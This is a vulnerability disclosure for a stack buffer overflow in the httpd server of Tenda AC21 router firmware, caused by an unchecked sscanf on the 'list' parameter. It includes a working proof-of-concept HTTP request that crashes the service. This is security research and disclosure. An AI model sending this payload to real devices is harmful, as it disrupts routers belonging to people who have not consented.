# Tenda AC21(V16.03.08.15) contains Stack Buffer Overflow Vulnerability

## overview

- Manufacturer's website information：https://www.tenda.com.cn/
- Firmware download address: https://www.tenda.com.cn/download/detail-3419.html

## product information

Tenda A21(V16.03.08.15), latest version of simulation overview：

![image-20220902192028747](readme.assets/image-20220902192028747.png)

## description

### 1. Vulnerability Details

Tenda AC21(V16.03.08.15) contains a stack overflow vulnerability in file `/bin/httpd`, function`formSetVirtualSer`

Attackers can cause this vulnerability via parameter `list`

In function `formSetVirtualSer`, it calls `save_virtualser_data` and vulnerability is in this function. 

![image-20220902214752440](readme.assets/image-20220902214752440.png)

In function `save_virtualser_data` , it calls `sscanf` to read strings in `v9`(a2) to parameter on the stack without checking its length , so there is a buffer overflow vulnerability. 

![image-20220902232253583](readme.assets/image-20220902232253583.png)																																															

### 2. Recurring loopholes and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /goform/SetVirtualServerCfg HTTP/1.1
Host: 192.168.0.1
Content-Length: 160
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/system_time.html?random=0.278922737111333&
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: password=25d55ad283aa400af464c76d713c07adfmbcvb
Connection: close

list=11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```

By sending this poc, we can make`httpd` reboot 

![image-20220902214733950](readme.assets/image-20220902214733950.png)